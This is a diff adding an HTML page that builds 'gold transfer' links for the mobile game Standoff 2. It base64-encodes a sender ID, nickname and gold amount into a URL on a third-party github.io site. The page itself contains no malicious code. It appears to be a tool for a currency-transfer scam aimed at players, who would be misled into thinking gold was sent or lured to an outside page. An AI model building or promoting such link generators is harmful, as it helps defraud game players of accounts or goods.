@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Gold transfer - Generator</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #121212;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      width: 90%;
+      max-width: 400px;
+      background-color: #1a1a1a;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+    }
+    h1, h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .input-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #555;
+      background-color: #333;
+      color: #fff;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #0066cc;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background-color: #005bb5;
+    }
+    .form-section {
+      margin-bottom: 20px;
+    }
+    #url-info {
+      margin-bottom: 20px;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+    #login-result {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Standoff 2 - Gold Transfer</h1>
+    <h2>Генератор ссылки для перевода голды</h2>
+    <div class="form-section">
+      <div class="input-group">
+        <label for="sender_id">ID отправителя:</label>
+        <input type="number" id="sender_id" placeholder="Введите ID" />
+      </div>
+      <div class="input-group">
+        <label for="sender_nick">Ник отправителя:</label>
+        <input type="text" id="sender_nick" placeholder="Введите ник" />
+      </div>
+      <div class="input-group">
+        <label for="gold_amount">Количество голды:</label>
+        <input type="number" id="gold_amount" placeholder="Введите количество голды" />
+      </div>
+      <button onclick="generateLink()">Сгенерировать ссылку</button>
+    </div>
+
+    <div id="url-info">
+      <h3>Сгенерированная ссылка:</h3>
+      <p id="generated-link">Ваша ссылка появится здесь...</p>
+    </div>
+  </div>
+
+  <script>
+    function generateLink() {
+      const sender_id = document.getElementById("sender_id").value;
+      const sender_nick = document.getElementById("sender_nick").value;
+      const gold_amount = document.getElementById("gold_amount").value;
+
+      if (!sender_id || !sender_nick || !gold_amount) {
+        alert("Пожалуйста, заполните все поля.");
+        return;
+      }
+
+      const encoded_str = `${sender_id.length}${sender_id}${sender_nick.length}${sender_nick}${gold_amount.length}${gold_amount}`;
+      const base64_encoded = btoa(encoded_str); // кодировка в base64
+      const url = `https://so2gold.github.io/GoldTransfer/?ID=${base64_encoded}`;
+
+      document.getElementById("generated-link").textContent = url;
+    }
+  </script>
+</body>
+</html>
